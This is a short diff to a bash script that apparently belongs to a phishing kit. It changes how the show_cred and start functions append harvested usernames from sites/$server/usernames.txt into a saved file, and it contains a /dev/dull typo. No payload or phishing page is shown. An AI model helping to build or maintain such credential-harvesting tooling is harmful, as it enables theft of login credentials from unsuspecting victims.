@@ -278,7 +278,7 @@ show_cred(){
     if [[ -e sites/$server/usernames.txt ]]; then
     printf "[+] Credentials found!\n"
     catch_cred
-    # cat sites/$server/usernames.txt >> saved.usernames.txt && rm -rf sites/$server/usernames.txt
+    cat sites/$server/usernames.txt >> saved.usernames.txt && rm -rf sites/$server/usernames.txt
     fi
     done
 }
@@ -287,7 +287,7 @@ start(){
     rm -rf sites/$server/ip.txt 
     fi
     if [[ -e sites/$server/usernames.txt ]]; then
-    cat sites/$server/usernames.txt >> saved.usernames.txt >/dev/dull 2>&1
+    #cat sites/$server/usernames.txt >> saved.usernames.txt >/dev/dull 2>&1
     rm -rf sites/$server/usernames.txt 
     fi
     read -p "[+] Enter the port on which you want to start (default:8080): " port 
